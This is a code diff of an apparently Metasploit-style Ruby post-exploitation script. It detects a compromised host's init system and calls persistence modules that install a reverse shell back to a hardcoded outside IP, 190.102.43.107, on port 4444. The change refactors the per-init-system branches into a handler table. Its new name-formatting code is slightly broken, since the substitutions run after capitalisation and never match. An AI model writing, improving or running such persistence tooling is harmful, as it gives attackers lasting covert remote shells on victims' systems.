@@ -14,41 +14,25 @@ sid       = client.sid
 print("\n")
 SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
-#ShellPromotion.run(fm, sid, target_ip, client)
-print("\n")
 
 init_type = InitDetector.detect(session)
 
 lhost = "190.102.43.107"
 lport = "4444"
 
-print("\n")
-if init_type == :sysvinit
-    print_status("SysVynit was detected")
-    RcLocalReverseShell.run(fm, sid, client,lhost,lport)
-end
+init_handlers = {
+  sysvinit: -> { RcLocalReverseShell.run(fm, sid, client, lhost, lport) },
+  systemd:  -> { SystemdReverseShell.run(fm, sid, client, lhost, lport) },
+  upstart:  -> { UpstartReverseShell.run(fm, sid, client, lhost, lport) },
+  busybox:  -> { BusyboxInittabReverseShell.run(fm, sid, client, lhost, lport) },
+  runit:    -> { RunitReverseShell.run(fm, sid, client, lhost, lport) },
+  openrc:   -> { OpenrcReverseShell.run(fm, sid, client, lhost, lport) }
+}
 
-if init_type == :systemd
-    print_status("Systemd was detected")
-    SystemdReverseShell.run(fm, sid, client,lhost,lport)
-end
-
-if init_type == :upstart
-    print_status("Upstart was detected")
-    UpstartReverseShell.run(fm, sid, client,lhost,lport)
-end
-
-if init_type == :busybox
-    print_status("Busybox was detected")
-    BusyboxInittabReverseShell.run(fm, sid, client,lhost,lport)
-end
-
-if init_type == :runit
-    print_status("RunIt was detected")
-    RunitReverseShell.run(fm, sid, client,lhost,lport)
-end
-
-if init_type == :openrc
-    print_status("OpenRC was detected")
-    OpenrcReverseShell.run(fm, sid, client,lhost,lport)
+if handler = init_handlers[init_type]
+  type_name = init_type.to_s.capitalize.gsub('sysvinit', 'SysVinit').gsub('busybox', 'Busybox')
+  print_status("#{type_name} was detected")
+  handler.call
+else
+  print_error("Unsupported or unknown init system: #{init_type}")
 end
